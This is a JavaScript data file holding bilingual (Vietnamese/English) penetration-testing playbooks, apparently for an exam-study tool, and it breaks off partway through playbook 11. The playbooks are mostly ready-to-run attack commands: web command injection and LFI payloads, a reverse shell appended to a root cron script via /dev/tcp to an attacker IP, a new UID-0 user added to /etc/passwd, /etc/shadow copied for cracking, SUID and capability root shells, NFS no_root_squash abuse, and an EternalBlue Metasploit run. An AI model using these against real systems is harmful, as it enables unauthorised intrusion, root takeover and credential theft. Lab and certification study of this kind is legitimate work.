// *** SỬA LỖI 1: Chuyển PLAYBOOKS thành Object thay vì Array ***
// Sử dụng 'id' làm key và loại bỏ 'id' bên trong value.
// Trường 'content' được giữ lại nhưng có vẻ không được sử dụng trong script.js.
const PLAYBOOKS = {
  "playbook_01_nmap_recon": {
    "title": {
      "vi": "Playbook 1: Recon & Port Scanning ban đầu với Nmap",
      "en": "Playbook 1: Initial Recon & Port Scanning with Nmap"
    },
    "assumption": "Bắt đầu với địa chỉ IP mục tiêu.",
    "objective": "Xác định cổng mở, dịch vụ, phiên bản, và lỗ hổng cơ bản bằng Nmap.",
    "tools": ["nmap"],
    "phases": ["Reconnaissance", "Enumeration"],
    "techniques": ["Port Scanning", "Service Detection", "Version Detection", "NSE Scanning"],
    "targets": ["TCP", "UDP"],
    "os": ["Any"],
    "tags": ["nmap", "port scan", "recon", "enumeration", "nse", "initial", "scanning"],
    "content": "## Playbook 1: Recon & Port Scanning ban đầu với Nmap 🎯\n\n**Giả định:** Bắt đầu với địa chỉ IP mục tiêu.\n\n**Mục tiêu:** Xác định cổng mở, dịch vụ, phiên bản, và lỗ hổng cơ bản bằng Nmap.\n\n**Các bước thực hiện:**\n\n1.  **Quét nhanh:** `nmap -F <target_ip> -oN quick_scan.txt`\n2.  **Quét cơ bản:** `nmap -sC -sV <target_ip> -oN initial_scan.txt`\n3.  **Quét toàn bộ cổng TCP:** `nmap -p- -sC -sV -T4 -Pn <target_ip> -oN full_tcp_scan.txt -oX full_tcp_scan.xml`\n4.  **Quét UDP (Nếu cần):** `sudo nmap -sU -p 161,53,137 -sV <target_ip> -oN udp_scan.txt`\n5.  **Quét Script Vuln:** `nmap -sV --script vuln <target_ip> -p <list_of_open_ports> -oN vuln_scan.txt`",
    "steps": [
      { "vi": "**Quét nhanh:**", "en": "**Quick Scan:**", "command": "nmap -F <target_ip> -oN quick_scan.txt" },
      { "vi": "**Quét cơ bản:**", "en": "**Basic Scan:**", "command": "nmap -sC -sV <target_ip> -oN initial_scan.txt" },
      { "vi": "**Quét toàn bộ cổng TCP:**", "en": "**Full TCP Scan:**", "command": "nmap -p- -sC -sV -T4 -Pn <target_ip> -oN full_tcp_scan.txt -oX full_tcp_scan.xml" },
      { "vi": "**Quét UDP (Nếu cần):**", "en": "**UDP Scan (If needed):**", "command": "sudo nmap -sU -p 161,53,137 -sV <target_ip> -oN udp_scan.txt" },
      { "vi": "**Quét Script Vuln:**", "en": "**Vuln Script Scan:**", "command": "nmap -sV --script vuln <target_ip> -p <list_of_open_ports> -oN vuln_scan.txt" }
    ],
    "related_knowledge_ids": ["nmap", "recon_port_scanning_nmap", "nmap_nse_scan", "snmp_enumeration", "port_53"]
  },
  "playbook_02_web_foothold": {
    "title": {
      "vi": "Playbook 2: Web Foothold qua Lỗ hổng RCE",
      "en": "Playbook 2: Web Foothold via RCE Vulnerability"
    },
    "assumption": "Phát hiện cổng web (80/443) đang mở.",
    "objective": "Tìm lỗ hổng web (LFI, Command Injection, File Upload, SQLi RCE) và giành reverse shell.",
    "tools": ["gobuster", "nikto", "curl", "msfvenom", "nc", "sqlmap", "wpscan"],
    "phases": ["Enumeration", "Initial Foothold", "Exploitation"],
    "techniques": ["Directory Busting", "Vulnerability Scanning", "LFI", "Command Injection", "File Upload", "SQL Injection", "Reverse Shell"],
    "targets": ["Web Server", "HTTP", "HTTPS"],
    "os": ["Any"],
    "tags": ["web", "foothold", "rce", "lfi", "command injection", "file upload", "sqli", "reverse shell", "gobuster", "nikto", "sqlmap", "wpscan", "exploit"],
    "content": "## Playbook 2: Web Foothold qua Lỗ hổng RCE 🌐➡️🐚\n\n**Giả định:** Phát hiện cổng web (80/443) đang mở.\n\n**Mục tiêu:** Tìm lỗ hổng web (LFI, Command Injection, File Upload, SQLi RCE) và giành reverse shell.\n\n**Các bước thực hiện:**\n\n1.  **Directory Busting:** `gobuster dir -u http://<target_ip>/ -w <wordlist> -x php,txt,html,bak -o gobuster.txt`\n2.  **Vuln Scan:** `nikto -h http://<target_ip>/ -o nikto.txt`\n3.  **CMS Scan (Nếu có):** `wpscan --url http://<target_ip>/ --enumerate vp,u ...`\n4.  **Kiểm tra LFI:** `curl \"http://<target_ip>/index.php?page=../../etc/passwd\"`. Thử Log Poisoning hoặc PHP Wrappers.\n5.  **Kiểm tra Command Injection:** `curl \"http://<target_ip>/ping.php?ip=8.8.8.8; id\"`.\n6.  **Kiểm tra File Upload:** Thử tải lên webshell (`shell.php`) và bypass bộ lọc.\n7.  **Kiểm tra SQLi RCE:** `sqlmap -r request.txt -p param --os-shell`. Hoặc thủ công (`xp_cmdshell` / `INTO OUTFILE`).\n8.  **Lấy Reverse Shell:** Mở listener `rlwrap nc -lvnp 4444`. Thực thi payload phù hợp (Bash, PowerShell, ...) qua lỗ hổng.",
    "steps": [
        { "vi": "**Directory Busting:**", "en": "**Directory Busting:**", "command": "gobuster dir -u http://<target_ip>/ -w <wordlist> -x php,txt,html,bak -o gobuster.txt" },
        { "vi": "**Vuln Scan:**", "en": "**Vuln Scan:**", "command": "nikto -h http://<target_ip>/ -o nikto.txt" },
        { "vi": "**CMS Scan (Nếu có):**", "en": "**CMS Scan (If applicable):**", "command": "wpscan --url http://<target_ip>/ --enumerate vp,u ..." },
        { "vi": "**Kiểm tra LFI:** Thử Log Poisoning hoặc PHP Wrappers.", "en": "**Check LFI:** Try Log Poisoning or PHP Wrappers.", "command": "curl \"http://<target_ip>/index.php?page=../../etc/passwd\"" },
        { "vi": "**Kiểm tra Command Injection:**", "en": "**Check Command Injection:**", "command": "curl \"http://<target_ip>/ping.php?ip=8.8.8.8; id\"" },
        { "vi": "**Kiểm tra File Upload:** Thử tải lên webshell (`shell.php`) và bypass bộ lọc.", "en": "**Check File Upload:** Try uploading webshell (`shell.php`) and bypass filters." },
        { "vi": "**Kiểm tra SQLi RCE:** Hoặc thủ công (`xp_cmdshell` / `INTO OUTFILE`).", "en": "**Check SQLi RCE:** Or manually (`xp_cmdshell` / `INTO OUTFILE`).", "command": "sqlmap -r request.txt -p param --os-shell" },
        { "vi": "**Lấy Reverse Shell:** Mở listener `rlwrap nc -lvnp 4444`. Thực thi payload.", "en": "**Get Reverse Shell:** Start listener `rlwrap nc -lvnp 4444`. Execute payload." }
    ],
    "related_knowledge_ids": ["port_80", "webapp_tool_gobuster", "nikto", "http_enumeration_cms", "lfi", "web_attack_lfi_rfi", "command_injection", "file_upload", "sqli_rce_sqlmap", "sqli_rce_manual", "rce_kali_setup", "rce_bash", "rce_powershell"]
  },
  "playbook_03_linux_privesc_sudo": {
    "title": {
      "vi": "Playbook 3: Linux PrivEsc qua Sudo Misconfiguration",
      "en": "Playbook 3: Linux PrivEsc via Sudo Misconfiguration"
    },
    "assumption": "Có shell user Linux và `sudo -l` hiển thị một lệnh có thể bị lạm dụng (ví dụ: `find`, `vim`, `less`, `cp`, `git`).",
    "objective": "Leo thang lên root bằng cách lạm dụng quyền sudo.",
    "tools": ["sudo", "GTFOBins (Website)"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Sudo Abuse"],
    "targets": ["Linux Sudo Configuration"],
    "os": ["Linux"],
    "tags": ["linux", "privesc", "sudo", "sudo -l", "gtfobins"],
    "content": "## Playbook 3: Linux PrivEsc qua Sudo Misconfiguration 🐧⬆️👑\n\n**Giả định:** Có shell user Linux và `sudo -l` hiển thị một lệnh có thể bị lạm dụng.\n\n**Mục tiêu:** Leo thang lên root bằng cách lạm dụng quyền sudo.\n\n**Các bước thực hiện:**\n\n1.  **Kiểm tra Sudo:** `sudo -l`. Xác định lệnh có thể chạy với sudo mà không cần mật khẩu hoặc với quyền root.\n2.  **Tra cứu GTFOBins:** Truy cập website GTFOBins, tìm kiếm lệnh đó trong mục 'Sudo'.\n3.  **Thực thi Payload:** Chạy lệnh sudo theo hướng dẫn trên GTFOBins để có shell root.\n    * Ví dụ (`find`): `sudo find . -exec /bin/sh -p \\; -quit`\n    * Ví dụ (`less`): `sudo less /etc/profile` sau đó gõ `!/bin/sh`.\n    * Ví dụ (`git`): `sudo git -p help config` sau đó `!/bin/bash`.\n4.  **Xác nhận Root:** `id`.",
    "steps": [
      { "vi": "**Kiểm tra Sudo:**", "en": "**Check Sudo:**", "command": "sudo -l" },
      { "vi": "**Tra cứu GTFOBins:** Tìm lệnh trong mục 'Sudo'.", "en": "**Lookup GTFOBins:** Find the command under 'Sudo'." },
      { "vi": "**Thực thi Payload (Ví dụ `find`):**", "en": "**Execute Payload (Example `find`):**", "command": "sudo find . -exec /bin/sh -p \\; -quit" },
      { "vi": "**Thực thi Payload (Ví dụ `less`):**", "en": "**Execute Payload (Example `less`):**", "command": "sudo less /etc/profile", "notes": { "vi": "sau đó gõ `!/bin/sh`", "en": "then type `!/bin/sh`" } },
      { "vi": "**Thực thi Payload (Ví dụ `git`):**", "en": "**Execute Payload (Example `git`):**", "command": "sudo git -p help config", "notes": { "vi": "sau đó `!/bin/bash`", "en": "then `!/bin/bash`" } },
      { "vi": "**Xác nhận Root:**", "en": "**Confirm Root:**", "command": "id" }
    ],
    "related_knowledge_ids": ["privesc_linux", "linuxprivesc_sudo_abuse", "sudo -l", "linuxprivesc_lab_suid_find_capstone", "capstone_attack_public_websrv1_privesc"]
  },
  "playbook_04_linux_privesc_suid": {
    "title": {
      "vi": "Playbook 4: Linux PrivEsc qua SUID Binary Abuse",
      "en": "Playbook 4: Linux PrivEsc via SUID Binary Abuse"
    },
    "assumption": "Có shell user Linux và `find / -perm -u=s -type f 2>/dev/null` tìm thấy một binary SUID có thể bị lạm dụng (ví dụ: `find`, `cp`, `vim`, `nmap`, `base64`, một binary tùy chỉnh).",
    "objective": "Leo thang lên root bằng cách lạm dụng SUID binary.",
    "tools": ["find", "GTFOBins (Website)"],
    "phases": ["Privilege Escalation"],
    "techniques": ["SUID Abuse"],
    "targets": ["Linux SUID Binaries"],
    "os": ["Linux"],
    "tags": ["linux", "privesc", "suid", "find", "gtfobins"],
    "content": "## Playbook 4: Linux PrivEsc qua SUID Binary Abuse 🐧⬆️👑\n\n**Giả định:** `find / -perm -u=s ...` tìm thấy một SUID binary có thể lạm dụng.\n\n**Mục tiêu:** Leo thang lên root bằng cách lạm dụng SUID binary.\n\n**Các bước thực hiện:**\n\n1.  **Tìm SUID Binaries:** `find / -perm -u=s -type f 2>/dev/null`.\n2.  **Tra cứu GTFOBins:** Truy cập GTFOBins, tìm kiếm binary đó trong mục 'SUID'.\n3.  **Thực thi Payload:** Chạy lệnh theo hướng dẫn trên GTFOBins để có shell root hoặc đọc/ghi file với quyền root.\n    * Ví dụ (`find`): `/usr/bin/find . -exec /bin/sh -p \\; -quit`\n    * Ví dụ (`cp`): `cp /etc/shadow /tmp/shadow_copy`, crack hash. Hoặc `cp /bin/sh /tmp/sh_copy; chmod +s /tmp/sh_copy; /tmp/sh_copy -p`.\n    * Ví dụ (`base64`): `base64 /etc/shadow | base64 --decode`.\n4.  **Xác nhận Root:** `id`.",
    "steps": [
      { "vi": "**Tìm SUID Binaries:**", "en": "**Find SUID Binaries:**", "command": "find / -perm -u=s -type f 2>/dev/null" },
      { "vi": "**Tra cứu GTFOBins:** Tìm binary trong mục 'SUID'.", "en": "**Lookup GTFOBins:** Find the binary under 'SUID'." },
      { "vi": "**Thực thi Payload (Ví dụ `find`):**", "en": "**Execute Payload (Example `find`):**", "command": "/usr/bin/find . -exec /bin/sh -p \\; -quit" },
      { "vi": "**Thực thi Payload (Ví dụ `cp` - đọc shadow):**", "en": "**Execute Payload (Example `cp` - read shadow):**", "command": "cp /etc/shadow /tmp/shadow_copy", "notes": { "vi": "Sau đó crack hash.", "en": "Then crack the hash." } },
      { "vi": "**Thực thi Payload (Ví dụ `cp` - shell):**", "en": "**Execute Payload (Example `cp` - shell):**", "command": "cp /bin/sh /tmp/sh_copy; chmod +s /tmp/sh_copy; /tmp/sh_copy -p" },
      { "vi": "**Thực thi Payload (Ví dụ `base64`):**", "en": "**Execute Payload (Example `base64`):**", "command": "base64 /etc/shadow | base64 --decode" },
      { "vi": "**Xác nhận Root:**", "en": "**Confirm Root:**", "command": "id" }
    ],
    "related_knowledge_ids": ["privesc_linux", "linuxprivesc_suid_capabilities_abuse", "find", "linuxprivesc_lab_suid_find_capstone"]
  },
  "playbook_05_linux_privesc_capabilities": {
    "title": {
      "vi": "Playbook 5: Linux PrivEsc qua Capabilities Abuse",
      "en": "Playbook 5: Linux PrivEsc via Capabilities Abuse"
    },
    "assumption": "Có shell user Linux và `getcap -r / 2>/dev/null` tìm thấy một binary với capabilities nguy hiểm (ví dụ: `python = cap_setuid+ep`, `perl = cap_setuid+ep`, `tar = cap_dac_read_search+ep`).",
    "objective": "Leo thang lên root bằng cách lạm dụng file capabilities.",
    "tools": ["getcap", "GTFOBins (Website)"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Capabilities Abuse"],
    "targets": ["Linux Capabilities"],
    "os": ["Linux"],
    "tags": ["linux", "privesc", "capabilities", "getcap", "gtfobins", "cap_setuid"],
    "content": "## Playbook 5: Linux PrivEsc qua Capabilities Abuse 🐧⬆️👑\n\n**Giả định:** `getcap -r / ...` tìm thấy binary với capabilities nguy hiểm.\n\n**Mục tiêu:** Leo thang lên root bằng cách lạm dụng capabilities.\n\n**Các bước thực hiện:**\n\n1.  **Tìm Capabilities:** `getcap -r / 2>/dev/null`.\n2.  **Tra cứu GTFOBins:** Truy cập GTFOBins, tìm kiếm binary đó trong mục 'Capabilities'.\n3.  **Thực thi Payload:** Chạy lệnh theo hướng dẫn trên GTFOBins.\n    * Ví dụ (`python` với `cap_setuid+ep`): `python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'`.\n    * Ví dụ (`tar` với `cap_dac_read_search+ep`): `tar -cf shadow.tar /etc/shadow`. Đọc `shadow.tar`.\n    * Ví dụ (`gdb` với `cap_setuid+ep`): `/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit`.\n4.  **Xác nhận Root:** `id`.",
    "steps": [
      { "vi": "**Tìm Capabilities:**", "en": "**Find Capabilities:**", "command": "getcap -r / 2>/dev/null" },
      { "vi": "**Tra cứu GTFOBins:** Tìm binary trong mục 'Capabilities'.", "en": "**Lookup GTFOBins:** Find the binary under 'Capabilities'." },
      { "vi": "**Thực thi Payload (Ví dụ `python`):**", "en": "**Execute Payload (Example `python`):**", "command": "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'" },
      { "vi": "**Thực thi Payload (Ví dụ `tar`):**", "en": "**Execute Payload (Example `tar`):**", "command": "tar -cf shadow.tar /etc/shadow", "notes": { "vi": "Đọc `shadow.tar` sau đó.", "en": "Read `shadow.tar` afterwards." } },
      { "vi": "**Thực thi Payload (Ví dụ `gdb`):**", "en": "**Execute Payload (Example `gdb`):**", "command": "/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit" },
      { "vi": "**Xác nhận Root:**", "en": "**Confirm Root:**", "command": "id" }
    ],
    "related_knowledge_ids": ["privesc_linux", "linuxprivesc_suid_capabilities_abuse", "getcap", "linuxprivesc_lab_capabilities_gdb"]
  },
  "playbook_06_linux_privesc_writable_cron": {
    "title": {
      "vi": "Playbook 6: Linux PrivEsc qua Writable Cron Job Script",
      "en": "Playbook 6: Linux PrivEsc via Writable Cron Job Script"
    },
    "assumption": "Có shell user Linux. Phát hiện (qua `pspy`, `linpeas`, hoặc kiểm tra thủ công) một script được chạy bởi cron với quyền root, và user hiện tại có quyền ghi vào script đó.",
    "objective": "Leo thang lên root bằng cách sửa đổi cron script.",
    "tools": ["pspy", "linpeas.sh", "cat", "ls", "echo", "nc"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Cron Job Abuse", "Insecure File Permissions"],
    "targets": ["Linux Cron Jobs"],
    "os": ["Linux"],
    "tags": ["linux", "privesc", "cron", "writable file", "insecure permissions", "pspy", "linpeas", "reverse shell"],
    "content": "## Playbook 6: Linux PrivEsc qua Writable Cron Job Script 🐧⬆️👑\n\n**Giả định:** Phát hiện cron script chạy bởi root có quyền ghi.\n\n**Mục tiêu:** Leo thang lên root bằng cách sửa đổi cron script.\n\n**Các bước thực hiện:**\n\n1.  **Xác định Script và Quyền:** Dùng `pspy` hoặc `grep CRON /var/log/syslog`. Kiểm tra quyền: `ls -la /path/to/script.sh`.\n2.  **Mở Listener:** Trên Kali, `rlwrap nc -lvnp 4445`.\n3.  **Chèn Payload:** Ghi đè hoặc nối thêm payload reverse shell vào script.\n    ```bash\n    echo '#!/bin/bash' > /path/to/script.sh # Ghi đè nếu cần\n    echo 'bash -i >& /dev/tcp/<kali_ip>/4445 0>&1' >> /path/to/script.sh \n    ```\n   \n4.  **Chờ Cron Chạy:** Đợi cron job kích hoạt script.\n5.  **Xác nhận Root:** `id` trong shell nhận được.",
    "steps": [
      { "vi": "**Xác định Script và Quyền:** Dùng `pspy` hoặc `grep CRON /var/log/syslog`.", "en": "**Identify Script & Permissions:** Use `pspy` or `grep CRON /var/log/syslog`.", "command": "ls -la /path/to/script.sh" },
      { "vi": "**Mở Listener:** Trên Kali.", "en": "**Start Listener:** On Kali.", "command": "rlwrap nc -lvnp 4445" },
      { "vi": "**Chèn Payload (Ghi đè):**", "en": "**Inject Payload (Overwrite):**", "command": "echo '#!/bin/bash' > /path/to/script.sh", "notes": { "vi": "(Ghi đè nếu cần)", "en": "(Overwrite if needed)" } },
      { "vi": "**Chèn Payload (Nối thêm):**", "en": "**Inject Payload (Append):**", "command": "echo 'bash -i >& /dev/tcp/<kali_ip>/4445 0>&1' >> /path/to/script.sh" },
      { "vi": "**Chờ Cron Chạy:**", "en": "**Wait for Cron:**" },
      { "vi": "**Xác nhận Root:**", "en": "**Confirm Root:**", "command": "id" }
    ],
    "related_knowledge_ids": ["linuxprivesc_cron_job_abuse", "linuxprivesc_cron_enum", "rce_kali_setup", "linuxprivesc_lab_cron_job_capstone"]
  },
  "playbook_07_linux_privesc_writable_passwd": {
    "title": {
      "vi": "Playbook 7: Linux PrivEsc qua Writable /etc/passwd",
      "en": "Playbook 7: Linux PrivEsc via Writable /etc/passwd"
    },
    "assumption": "Có shell user Linux và `find /etc/passwd -writable` xác nhận file /etc/passwd có quyền ghi.",
    "objective": "Leo thang lên root bằng cách thêm user mới vào /etc/passwd.",
    "tools": ["find", "openssl", "echo", "su"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Writable /etc/passwd", "Insecure File Permissions"],
    "targets": ["/etc/passwd"],
    "os": ["Linux"],
    "tags": ["linux", "privesc", "writable file", "insecure permissions", "etc_passwd", "openssl", "su"],
    "content": "## Playbook 7: Linux PrivEsc qua Writable /etc/passwd 🐧⬆️👑\n\n**Giả định:** `/etc/passwd` có quyền ghi.\n\n**Mục tiêu:** Leo thang lên root bằng cách thêm user mới.\n\n**Các bước thực hiện:**\n\n1.  **Xác nhận Quyền ghi:** `ls -la /etc/passwd`.\n2.  **Tạo Hash Mật khẩu:** `openssl passwd -1 -salt xyz <YourPassword>`. Copy hash.\n3.  **Thêm User Root mới:**\n    ```bash\n    echo \"newroot:<hash_from_openssl>:0:0:root:/root:/bin/bash\" >> /etc/passwd\n    ```\n   \n4.  **Chuyển sang User Root:** `su newroot` (Nhập mật khẩu đã tạo).\n5.  **Xác nhận Root:** `id`.",
    "steps": [
      { "vi": "**Xác nhận Quyền ghi:**", "en": "**Confirm Write Permissions:**", "command": "ls -la /etc/passwd" },
      { "vi": "**Tạo Hash Mật khẩu:** Copy hash.", "en": "**Create Password Hash:** Copy the hash.", "command": "openssl passwd -1 -salt xyz <YourPassword>" },
      { "vi": "**Thêm User Root mới:**", "en": "**Add New Root User:**", "command": "echo \"newroot:<hash_from_openssl>:0:0:root:/root:/bin/bash\" >> /etc/passwd" },
      { "vi": "**Chuyển sang User Root:** Nhập mật khẩu.", "en": "**Switch to Root User:** Enter password.", "command": "su newroot" },
      { "vi": "**Xác nhận Root:**", "en": "**Confirm Root:**", "command": "id" }
    ],
    "related_knowledge_ids": ["linuxprivesc_passwd_abuse", "openssl", "linuxprivesc_lab_passwd_abuse_capstone", "su"]
  },
  "playbook_08_linux_privesc_kernel_exploit": {
    "title": {
      "vi": "Playbook 8: Linux PrivEsc qua Kernel Exploit",
      "en": "Playbook 8: Linux PrivEsc via Kernel Exploit"
    },
    "assumption": "Có shell user Linux và `uname -a` cho thấy phiên bản kernel có khả năng dính lỗ hổng LPE đã biết.",
    "objective": "Leo thang lên root bằng cách khai thác lỗ hổng kernel.",
    "tools": ["uname", "searchsploit", "gcc", "wget", "curl"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Kernel Exploit", "LPE"],
    "targets": ["Linux Kernel"],
    "os": ["Linux"],
    "tags": ["linux", "privesc", "kernel exploit", "lpe", "uname", "searchsploit", "gcc"],
    "content": "## Playbook 8: Linux PrivEsc qua Kernel Exploit 🐧💥👑\n\n**Giả định:** Phát hiện kernel có khả năng dính lỗ hổng LPE.\n\n**Mục tiêu:** Khai thác kernel để lên root.\n\n**Các bước thực hiện:**\n\n1.  **Xác định Kernel:** `uname -a`. `cat /etc/os-release`.\n2.  **Tìm Exploit:** Trên Kali, `searchsploit Linux Kernel <version> <distro> local privilege escalation`.\n3.  **Lấy và Biên dịch Exploit:**\n    * Kali: `searchsploit -m <id.c>`. Đọc code, `gcc <id.c> -o exploit_bin`.\n    * Chuyển `exploit_bin` lên target (`/tmp`) bằng `wget` hoặc `curl`.\n    * Target: `chmod +x /tmp/exploit_bin`.\n4.  **Chạy Exploit:** `/tmp/exploit_bin`.\n5.  **Xác nhận Root:** `id`.\n\n**Lưu ý:** Chỉ dùng khi các cách khác thất bại do rủi ro crash.",
    "steps": [
      { "vi": "**Xác định Kernel:**", "en": "**Identify Kernel:**", "command": "uname -a; cat /etc/os-release" },
      { "vi": "**Tìm Exploit (Kali):**", "en": "**Find Exploit (Kali):**", "command": "searchsploit Linux Kernel <version> <distro> local privilege escalation" },
      { "vi": "**Lấy Exploit (Kali):**", "en": "**Get Exploit (Kali):**", "command": "searchsploit -m <id.c>" },
      { "vi": "**Biên dịch Exploit (Kali):**", "en": "**Compile Exploit (Kali):**", "command": "gcc <id.c> -o exploit_bin" },
      { "vi": "**Chuyển Exploit lên Target:** (ví dụ: wget/curl)", "en": "**Transfer Exploit to Target:** (e.g., wget/curl)" },
      { "vi": "**Cấp quyền thực thi (Target):**", "en": "**Grant Execute Permissions (Target):**", "command": "chmod +x /tmp/exploit_bin" },
      { "vi": "**Chạy Exploit (Target):**", "en": "**Run Exploit (Target):**", "command": "/tmp/exploit_bin" },
      { "vi": "**Xác nhận Root:**", "en": "**Confirm Root:**", "command": "id" }
    ],
    "related_knowledge_ids": ["linuxprivesc_kernel_exploit", "linuxprivesc_manual_kernel_exploit", "uname", "searchsploit", "exploitation_finding_exploits_searchsploit", "gcc", "file_transfer_download_linux"]
  },
  "playbook_09_linux_privesc_nfs_no_root_squash": {
    "title": {
      "vi": "Playbook 9: Linux PrivEsc qua NFS no_root_squash",
      "en": "Playbook 9: Linux PrivEsc via NFS no_root_squash"
    },
    "assumption": "Có shell user Linux. `showmount -e <target_ip>` (hoặc `cat /etc/exports` trên target) hiển thị một share NFS được export với tùy chọn `no_root_squash`.",
    "objective": "Leo thang lên root bằng cách lạm dụng cấu hình NFS.",
    "tools": ["showmount", "mount", "gcc", "cp", "chmod"],
    "phases": ["Privilege Escalation"],
    "techniques": ["NFS Abuse", "no_root_squash", "SUID Abuse"],
    "targets": ["NFS Share"],
    "os": ["Linux"],
    "tags": ["linux", "privesc", "nfs", "no_root_squash", "mount", "suid"],
    "content": "## Playbook 9: Linux PrivEsc qua NFS no_root_squash 🐧⬆️👑\n\n**Giả định:** Phát hiện NFS share với `no_root_squash`.\n\n**Mục tiêu:** Leo thang lên root qua NFS.\n\n**Các bước thực hiện:**\n\n1.  **Xác nhận `no_root_squash`:** `showmount -e <target_ip>`.\n2.  **Mount Share trên Kali:**\n    ```bash\n    sudo mkdir /mnt/nfs_share\n    sudo mount -t nfs <target_ip>:/<share_path> /mnt/nfs_share -o nolock \n    ```\n   \n3.  **Tạo SUID Binary trên Kali (trong thư mục mount):**\n    * Cách 1 (Copy bash): `sudo cp /bin/bash /mnt/nfs_share/rootshell`, `sudo chmod +s /mnt/nfs_share/rootshell`.\n    * Cách 2 (Compile C code): Tạo `suid.c` (`setuid(0); setgid(0); system(\"/bin/bash -p\");`). `gcc suid.c -o /mnt/nfs_share/rootshell`, `sudo chown root:root /mnt/nfs_share/rootshell`, `sudo chmod +s /mnt/nfs_share/rootshell`.\n4.  **Unmount Share trên Kali (Tùy chọn):** `sudo umount /mnt/nfs_share`.\n5.  **Thực thi trên Target:** Từ shell user trên target, chạy binary SUID: `/<share_path>/rootshell -p`.\n6.  **Xác nhận Root:** `id`.",
    "steps": [
      { "vi": "**Xác nhận `no_root_squash`:**", "en": "**Confirm `no_root_squash`:**", "command": "showmount -e <target_ip>" },
      { "vi": "**Tạo thư mục Mount (Kali):**", "en": "**Create Mount Directory (Kali):**", "command": "sudo mkdir /mnt/nfs_share" },
      { "vi": "**Mount Share (Kali):**", "en": "**Mount Share (Kali):**", "command": "sudo mount -t nfs <target_ip>:/<share_path> /mnt/nfs_share -o nolock" },
      { "vi": "**Tạo SUID Binary - Cách 1 (Copy bash, Kali):**", "en": "**Create SUID Binary - Method 1 (Copy bash, Kali):**", "command": "sudo cp /bin/bash /mnt/nfs_share/rootshell; sudo chmod +s /mnt/nfs_share/rootshell" },
      { "vi": "**Tạo SUID Binary - Cách 2 (Compile C, Kali):**", "en": "**Create SUID Binary - Method 2 (Compile C, Kali):**", "notes": { "vi": "Tạo `suid.c` với nội dung `setuid(0); setgid(0); system(\"/bin/bash -p\");`", "en": "Create `suid.c` with content `setuid(0); setgid(0); system(\"/bin/bash -p\");`" } },
      { "vi": "(Tiếp) Compile C:", "en": "(Cont.) Compile C:", "command": "gcc suid.c -o /mnt/nfs_share/rootshell; sudo chown root:root /mnt/nfs_share/rootshell; sudo chmod +s /mnt/nfs_share/rootshell" },
      { "vi": "**Unmount Share (Kali, Tùy chọn):**", "en": "**Unmount Share (Kali, Optional):**", "command": "sudo umount /mnt/nfs_share" },
      { "vi": "**Thực thi trên Target:**", "en": "**Execute on Target:**", "command": "/<share_path>/rootshell -p" },
      { "vi": "**Xác nhận Root:**", "en": "**Confirm Root:**", "command": "id" }
    ],
    "related_knowledge_ids": ["port_2049", "linuxprivesc_nfs_no_root_squash", "showmount", "mount", "cp", "chmod"]
  },
  "playbook_10_windows_foothold_ms17_010": {
    "title": {
      "vi": "Playbook 10: Windows Foothold qua MS17-010 (EternalBlue)",
      "en": "Playbook 10: Windows Foothold via MS17-010 (EternalBlue)"
    },
    "assumption": "Nmap (`--script smb-vuln-ms17-010`) xác nhận Port 445 (SMB) trên máy Windows mục tiêu (thường Win7/2008) dễ bị tấn công bởi MS17-010.",
    "objective": "Giành quyền truy cập SYSTEM shell bằng cách khai thác MS17-010.",
    "tools": ["nmap", "metasploit"],
    "phases": ["Initial Foothold", "Exploitation"],
    "techniques": ["SMB Exploit", "MS17-010", "EternalBlue", "RCE"],
    "targets": ["Windows SMB (Vulnerable)"],
    "os": ["Windows"],
    "tags": ["windows", "foothold", "smb", "ms17-010", "eternalblue", "rce", "system", "nmap", "metasploit"],
    "content": "## Playbook 10: Windows Foothold qua MS17-010 (EternalBlue) 🚪💥👑\n\n**Giả định:** Nmap xác nhận SMB dễ bị tấn công bởi MS17-010.\n\n**Mục tiêu:** Giành SYSTEM shell qua MS17-010.\n\n**Các bước thực hiện:**\n\n1.  **Xác nhận Lỗ hổng:** `nmap -p 445 --script smb-vuln-ms17-010 <target_ip>`.\n2.  **Sử dụng Metasploit:**\n    ```bash\n    msfconsole\n    use exploit/windows/smb/ms17_010_eternalblue \n    set RHOSTS <target_ip>\n    # set PAYLOAD windows/x64/meterpreter/reverse_tcp (hoặc payload phù hợp)\n    set LHOST <kali_ip>\n    run \n    ```\n   \n3.  **Xác nhận Shell:** Nếu thành công, bạn sẽ có Meterpreter hoặc shell với quyền `NT AUTHORITY\\SYSTEM`.",
    "steps": [
      { "vi": "**Xác nhận Lỗ hổng:**", "en": "**Confirm Vulnerability:**", "command": "nmap -p 445 --script smb-vuln-ms17-010 <target_ip>" },
      { "vi": "**Sử dụng Metasploit:**", "en": "**Use Metasploit:**", "command": "msfconsole" },
      { "vi": "(MSF) Chọn Exploit:", "en": "(MSF) Select Exploit:", "command": "use exploit/windows/smb/ms17_010_eternalblue" },
      { "vi": "(MSF) Đặt Target:", "en": "(MSF) Set Target:", "command": "set RHOSTS <target_ip>" },
      { "vi": "(MSF) Đặt Listener:", "en": "(MSF) Set Listener:", "command": "set LHOST <kali_ip>" },
      { "vi": "(MSF) Chạy:", "en": "(MSF) Run:", "command": "run" },
      { "vi": "**Xác nhận Shell:** Quyền `NT AUTHORITY\\SYSTEM`.", "en": "**Confirm Shell:** `NT AUTHORITY\\SYSTEM` privileges." }
    ],
    "related_knowledge_ids": ["port_445", "nmap", "metasploit"]
  },
  "playbook_11_windows_foothold_ftp_anon": {
    "title": {
      "vi": "Playbook 11: Windows Foothold qua FTP Anonymous Login + Upload",
      "en": "Playbook 11: Windows Foothold via FTP Anonymous Login + Upload"
    },
    "assumption": "Nmap tìm thấy Port 21 (FTP) mở, cho phép đăng nhập `anonymous` và có quyền ghi (upload). Có thể có web server đang chạy.",
    "objective": "Giành reverse shell bằng cách tải lên webshell hoặc executable qua FTP.",
    "tools": ["nmap", "ftp", "msfvenom", "nc"],
    "phases": ["Initial Foothold", "Exploitation"],
    "techniques": ["FTP Anonymous Login", "File Upload", "Webshell", "Reverse Shell"],
    "targets": ["FTP Server", "Web Server"],
